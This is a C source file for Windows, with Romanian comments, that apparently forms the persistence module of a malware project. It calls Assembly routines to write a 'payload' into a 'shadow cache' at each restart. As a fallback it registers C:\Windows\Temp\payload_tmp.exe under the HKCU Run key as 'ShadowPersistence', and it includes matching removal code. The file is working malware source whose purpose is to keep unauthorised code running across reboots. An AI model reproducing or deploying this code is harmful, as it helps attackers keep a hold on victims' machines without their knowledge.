#include <stdio.h>
#include <windows.h>
#include "persistence.h"
#include "utils.h"

// Extern: Funcția Assembly pentru scrierea payload-ului în shadow cache la fiecare restart
extern void shadow_persistence_enable();
extern void shadow_persistence_disable();

/**
 * enable_persistence
 * Configurează mecanismele de persistență folosind shadow cache și temporare.
 * În caz că shadow cache nu este accesibil, fallback-ul va fi un registry run key.
 */
void enable_persistence() {
    log_event("Enabling persistence...");

    // Apelăm funcția Assembly pentru a seta persistența prin shadow cache
    shadow_persistence_enable();

    // Setăm și un fallback în registry în caz că shadow persistence este eliminat
    HKEY hKey;
    const char* payload_path = "C:\\Windows\\Temp\\payload_tmp.exe";
    const char* reg_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* reg_name = "ShadowPersistence";

    // Deschidem sau creăm cheiul de registry pentru autostart
    if (RegOpenKey(HKEY_CURRENT_USER, reg_key, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, reg_name, 0, REG_SZ, (const BYTE*)payload_path, strlen(payload_path) + 1);
        RegCloseKey(hKey);
        log_event("Fallback persistence set in registry.");
    } else {
        log_event("Failed to set registry fallback for persistence.");
    }
}

/**
 * disable_persistence
 * Elimină persistența prin shadow cache și curăță cheia de registry folosită ca fallback.
 */
void disable_persistence() {
    log_event("Disabling persistence...");

    // Apel Assembly pentru a dezactiva persistența shadow
    shadow_persistence_disable();

    // Ștergem cheia de registry de autostart
    HKEY hKey;
    const char* reg_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* reg_name = "ShadowPersistence";

    if (RegOpenKey(HKEY_CURRENT_USER, reg_key, &hKey) == ERROR_SUCCESS) {
        RegDeleteValue(hKey, reg_name);
        RegCloseKey(hKey);
        log_event("Fallback persistence removed from registry.");
    } else {
        log_event("Failed to remove registry fallback for persistence.");
    }
}

